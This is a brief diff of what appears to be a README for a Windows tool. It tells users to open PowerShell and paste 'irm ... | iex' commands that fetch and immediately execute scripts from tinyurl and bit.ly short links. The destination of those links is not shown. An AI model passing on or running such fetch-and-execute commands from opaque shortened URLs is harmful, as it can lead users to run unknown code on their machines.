@@ -3,4 +3,4 @@ dont forget - zen1xula sigma xD made by https://github.com/Christitustech/ short
 
 
 to use = WIN + R write powershell
-in powershell write irm "https://tinyurl.com/winut" | iex
+in powershell write **irm "https://tinyurl.com/winut" | iex** or **irm "bit.ly/zenut" | iex**
